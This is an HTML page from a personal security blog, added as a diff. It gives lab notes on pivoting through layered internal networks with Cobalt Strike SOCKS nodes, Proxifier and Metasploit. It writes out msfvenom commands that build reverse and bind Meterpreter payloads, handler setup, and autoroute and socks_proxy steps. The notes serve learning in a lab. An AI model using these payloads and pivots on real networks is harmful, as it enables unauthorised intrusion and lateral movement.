@@ -1,0 +1,303 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>最简单的代理技术 | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="最简单的代理技术 | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）   本身网络架构不通
+代理协议:SOCKS4/5
+代理软件: Proxifier
+实验类似这样
+win7是可以出网  其余三台是出不了网     流程就是拿下win7  ..." />
+    <meta name="keywords" content="内网,笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              最简单的代理技术
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-23
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/fFh5Cdh2h/" class="post-tag">
+                  # 内网
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/ujY9_0y-bw/" class="post-tag">
+                  # 笔记
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）   本身网络架构不通</p>
+<p>代理协议:SOCKS4/5</p>
+<p>代理软件: Proxifier</p>
+<p>实验类似这样</p>
+<p>win7是可以出网  其余三台是出不了网     流程就是拿下win7  建立代理节点  攻击机通过代理就可以访问到11网段了   正向连接win10   建立节点 就可以访问22网段  再正向连接win2008  建立节点  就可以访问33网段了</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401221446176.png" alt="image" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401221455615.png" alt="image-20240122145527573" loading="lazy"></figure>
+<h1 id="cs">CS</h1>
+<p><strong>这个socks节点是建立在cs起的服务端上面的</strong>    本机与kali是通的       建立代理节点之后kali与每个虚拟机是通的       kali(cs服务端)就起的是一个流量中转的作用         (不要去想在这些虚拟机上面做了什么 越想越迷糊  知道在kali上做了socks代理后 可以通就行了)</p>
+<h2 id="第一层">第一层</h2>
+<p>建立代理前  去访问http://192.168.11.128/ （win10上的资产）是访问不到的</p>
+<p>先上线win7    在cs上的win7会话上做个节点</p>
+<p>操作：代理转发-Socks代理</p>
+<p>在 cs的服务端(kali)  上建立个代理节点   流量会走这个端口  39037</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401221459640.png" alt="" loading="lazy"></figure>
+<p>在本机proxifier上配置一下  注意地址不是win7的 <strong>而是kali(cs服务端的地址)</strong>     本机就可以访问到11段了</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401221957062.png" alt="image-20240122195716014" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401230002398.png" alt="image-20240123000205364" loading="lazy"></figure>
+<h2 id="第二层">第二层</h2>
+<p>访问  http://192.168.22.128/ 是访问不到的</p>
+<p>现在是要与win2008通讯   借助win10(他俩互通      这里采用正向连接</p>
+<p>在cs上生成一个 正连的🐎 (先添加监听器) 然后在win7的cs 会话 那去连接win10  (win10先打开一下那个🐎 等着来连接)    命令：connect ip port</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401230002797.png" alt="image-20240123000215772" loading="lazy"></figure>
+<p>然后继续在cs的win10会话上建立一个Socks代理   21781</p>
+<p>然后再去proxifier配置    注意这里的地址 仍然是起cs服务的地址</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222003269.png" alt="image-20240122200325236" loading="lazy"></figure>
+<p>再配置下代理规则</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222004044.png" alt="" loading="lazy"></figure>
+<p>然后再本机上面 就可以访问</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222005134.png" alt="image-20240122200523109" loading="lazy"></figure>
+<h2 id="第三层">第三层</h2>
+<p>跟第二操作一样			🐎子还是正向</p>
+<p>现在我们与win2008通讯了   现在以win2008为跳板去访问到win2012</p>
+<p>上线 开个socks代理  配置  就可以与33网段通讯了</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222010349.png" alt="image-20240122201043256" loading="lazy"></figure>
+<p>socks 20820</p>
+<p>现在本机就可以直搭33网段</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222012137.png" alt="image-20240122201232110" loading="lazy"></figure>
+<h1 id="msf">MSF</h1>
+<p>需要添加路由</p>
+<h2 id="第一层-2">第一层</h2>
+<p>先让win7上线</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7   LPORT=7788 -f exe -o q1.exe</p>
+<p>监听。上线</p>
+<h3 id="添加路由">添加路由</h3>
+<p>查看路由信息</p>
+<p>run autoroute -p</p>
+<p>添加</p>
+<p>run post/multi/manage/autoroute  (自动)</p>
+<p>添加指定路由，1是接收的session编号   route add 192.168.11.0 255.255.255.0  1</p>
+<p>这个时候只有msf可以与11的通讯 而其他的没有     还是要建立节点</p>
+<h3 id="socks代理">Socks代理</h3>
+<p>这里的代理 是开在MSF服务端 而不是win7         建立了socks   kali就享有了win7的流量</p>
+<p>use auxiliary/server/socks_proxy</p>
+<p>set srvhost 0.0.0.0</p>
+<p>set srvport 3344</p>
+<p>run</p>
+<p>启用代理软件配置Sock5代理</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222250850.png" alt="image-20240122225022807" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222251087.png" alt="image-20240122225116055" loading="lazy"></figure>
+<h2 id="第二层-2">第二层</h2>
+<p>​	上线win10  从win7到win10      与22网段通讯</p>
+<p>生成正向🐎</p>
+<p>msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0  LPORT=6612 -f exe &gt; rs1.exe</p>
+<p>win10点🐎</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/bind_tcp</p>
+<p>set rhost 192.168.11.128</p>
+<p>set lport 6612</p>
+<p>run</p>
+<h3 id="路由">路由</h3>
+<p>再次添加路由</p>
+<p>先进入sessions -i 2</p>
+<p>查看路由信息</p>
+<p>run autoroute -p</p>
+<p>添加</p>
+<p>run post/multi/manage/autoroute</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222349725.png" alt="image-20240122234926667" loading="lazy"></figure>
+<p>还是得要建立socks节点</p>
+<h2 id="socks">socks</h2>
+<p>use auxiliary/server/socks_proxy</p>
+<p>set srvhost 0.0.0.0</p>
+<p>set srvport 3355</p>
+<p>run</p>
+<p>然后代理软件设置一下 就可以与22网段通讯了</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401222353622.png" alt="image-20240122235334595" loading="lazy"></figure>
+<h2 id="第三层-2">第三层</h2>
+<p>与33网段通讯(win2012)   跟第二层一样的  正向连接     新建路由   建立socks   就可以与33网段通讯</p>
+<h1 id="总结">总结</h1>
+<p>​	就是一步一步来 先取得一个 再取得另外一个    在这不考虑获得权限的过程  只考虑网络互通的情况</p>
+<p>​	socks节点是在cs msf服务端建立的 所以软件连接节点的时候的ip要注意！</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401230019278.png" alt="image-20240123001948236" loading="lazy"></figure>
+<h1 id="后言">后言</h1>
+<p>若做了入站策略又该怎么办呢</p>
+<p>隧道or反向</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#cs">CS</a>
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%B1%82">第一层</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%B1%82">第二层</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E5%B1%82">第三层</a></li>
+</ul>
+</li>
+<li><a href="#msf">MSF</a>
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%B1%82-2">第一层</a>
+<ul>
+<li><a href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1">添加路由</a></li>
+<li><a href="#socks%E4%BB%A3%E7%90%86">Socks代理</a></li>
+</ul>
+</li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%B1%82-2">第二层</a>
+<ul>
+<li><a href="#%E8%B7%AF%E7%94%B1">路由</a></li>
+</ul>
+</li>
+<li><a href="#socks">socks</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E5%B1%82-2">第三层</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%90%8E%E8%A8%80">后言</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/shu-ju-ku-ti-quan-xiao-jie/">
+              <h3 class="post-title">
+                数据库提权小结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
